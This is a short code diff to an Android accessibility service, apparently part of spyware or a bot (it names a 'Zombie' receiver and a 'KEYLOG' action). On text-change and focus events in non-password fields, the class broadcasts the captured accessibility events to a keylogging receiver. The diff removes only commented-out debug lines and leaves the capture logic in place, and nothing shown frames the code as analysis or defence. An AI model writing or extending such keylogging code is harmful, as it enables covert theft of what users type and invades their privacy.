@@ -41,15 +41,11 @@ public class EyeAccessService extends AccessibilityService {
 		} else if ( !isPassword && (eventType & AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ) {
 			Intent wakeup = new Intent();
 			wakeup.setAction(Zombie_BroadcastReceiver.ACTION_KEYLOG);
-			//wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_EVENT_TYPE,Zombie_BroadcastReceiver.EVENT_CHANGED);
 			wakeup.putExtra("event",event);
 			this.sendBroadcast(wakeup);
-			//NetLog.v("%s : Changed on %s [%s]",packName,className,text);
 		} else 	if ( (eventType & AccessibilityEvent.TYPE_VIEW_FOCUSED) == AccessibilityEvent.TYPE_VIEW_FOCUSED ) {
-			//NetLog.v("%s : Focused on %s [%s]",packName,className,text);
 			Intent wakeup = new Intent();
 			wakeup.setAction(Zombie_BroadcastReceiver.ACTION_KEYLOG);
-			//wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_EVENT_TYPE,Zombie_BroadcastReceiver.EVENT_FOCUSED);
 			wakeup.putExtra("event",event);
 			this.sendBroadcast(wakeup);
 		} else 	if ( (eventType & AccessibilityEvent.TYPE_VIEW_SELECTED) == AccessibilityEvent.TYPE_VIEW_SELECTED ) {
